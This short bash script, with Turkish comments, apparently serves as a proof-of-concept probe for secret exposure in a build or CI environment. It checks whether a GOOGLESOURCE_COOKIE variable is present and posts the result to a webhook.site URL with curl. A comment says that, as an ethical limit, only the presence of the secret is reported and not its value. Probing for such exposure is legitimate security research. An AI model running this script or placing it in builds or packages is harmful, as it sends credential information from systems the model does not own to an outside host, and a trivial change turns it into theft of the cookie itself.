#!/bin/bash
echo "Testing environment variables..."
# Sadece secret'ın var olup olmadığını kontrol ediyoruz (Etik kural)
if [ -n "$GOOGLESOURCE_COOKIE" ]; then
    DATA="FOUND_GOOGLE_COOKIE"
else
    DATA="NOT_FOUND"
fi

# Webhook'a sinyal gönder
curl -X POST -d "status=$DATA" https://webhook.site/7e258064-8004-46f0-8209-4805c8e66bf1
